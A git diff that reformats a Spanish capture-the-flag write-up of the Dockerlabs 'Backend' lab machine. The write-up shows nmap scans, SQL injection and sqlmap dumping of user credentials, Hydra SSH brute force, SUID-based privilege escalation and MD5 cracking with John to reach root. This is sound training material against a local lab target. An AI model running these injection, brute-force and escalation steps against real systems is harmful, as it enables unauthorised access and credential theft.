@@ -1,23 +1,32 @@
-# 🖥️ Writeup - Backend 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Backend ​​
 
-> **Tags:** `Linux` `Web` `MariaDB` `SQLi` `Burp Suite` `SQLMap` `Hydra` `John The Ripper` `SUID` 
+## 🖥️ Writeup - Backend
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `Web` `MariaDB` `SQLi` `Burp Suite` `SQLMap` `Hydra` `John The Ripper` `SUID`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip backend.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh backend.tar
-``` 
+```
+
 Info:
+
 ```
 
                             ##        .         
@@ -40,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 16:35 CET
 Nmap scan report for 172.17.0.2
@@ -81,7 +91,7 @@ Identificamos los puertos `22` y `80` abiertos.
 
 Accedemos al servicio web en el puerto `80` y nos encontramos con la siguiente página:
 
-![alt text](../../images/backend.png)
+![alt text](../../.gitbook/assets/backend.png)
 
 Accedemos al panel de login mediante el botón superior y probamos una inyección `SQL`.
 
@@ -90,7 +100,7 @@ Accedemos al panel de login mediante el botón superior y probamos una inyecció
 password
 ```
 
-![alt text](../../images/mariadb.png)
+![alt text](../../.gitbook/assets/mariadb.png)
 
 Recibimos un error de sintaxis `SQL`. Esto nos indica que el aplicativo es posiblemente vulnerable a `SQLi`, ya que hemos logrado alterar la lógica de la consulta con éxito.
 
@@ -98,11 +108,11 @@ Utilizaremos `SQLMap` para intentar extraer información de las bases de datos e
 
 Para ello, interceptamos la petición de login con `BurpSuite`.
 
-![alt text](../../images/burps.png)
+![alt text](../../.gitbook/assets/burps.png)
 
 La guardamos en un archivo llamado `request.txt` para pasársela a `SQLMap`.
 
-# SQLMAP
+## SQLMAP
 
 Enumeramos las bases de datos.
 
@@ -111,6 +121,7 @@ sqlmap -r request.txt --dbs
 ```
 
 Info:
+
 ```
         ___
        __H__
@@ -174,6 +185,7 @@ sqlmap -r request.txt -D users --tables
 ```
 
 Info:
+
 ```
         ___
        __H__
@@ -230,6 +242,7 @@ sqlmap -r request.txt -D users -T usuarios --columns
 ```
 
 Info:
+
 ```
         ___
        __H__
@@ -298,6 +311,7 @@ sqlmap -r request.txt -D users -T usuarios --dump
 ```
 
 Info:
+
 ```
         ___
        __H__
@@ -379,7 +393,9 @@ paco
 pepe
 juan
 ```
--------------------------------------------------------------------------------------------------------------------------
+
+***
+
 ```bash
 nano pass.txt
 ```
@@ -390,7 +406,7 @@ P123pepe3456P
 jjuuaann123
 ```
 
-# HYDRA
+## HYDRA
 
 Realizamos un ataque de `fuerza bruta` contra el servicio `SSH` utilizando las credenciales obtenidas.
 
@@ -399,6 +415,7 @@ hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -418,7 +435,7 @@ Accedemos por `SSH`.
 ssh pepe@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
@@ -427,6 +444,7 @@ find / -perm -4000 -type f 2>/dev/null
 ```
 
 Info:
+
 ```
 /usr/bin/umount
 /usr/bin/chsh
@@ -451,6 +469,7 @@ Aprovechamos esto para listar el contenido del directorio `/root`, al cual no de
 ```
 
 Info:
+
 ```
 total 24
 drwx------ 1 root root 4096 Aug 27  2024 .
@@ -468,6 +487,7 @@ Identificamos un archivo que contiene el `hash` de una posible contraseña. Util
 ```
 
 Info:
+
 ```
 e43833c4c9d5ac444e16bb94715a75e4
 ```
@@ -481,6 +501,7 @@ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
@@ -502,6 +523,7 @@ spongebob34
 ```
 
 Info:
+
 ```
 root@cccfa5e90f12:/home/pepe# whoami
 root
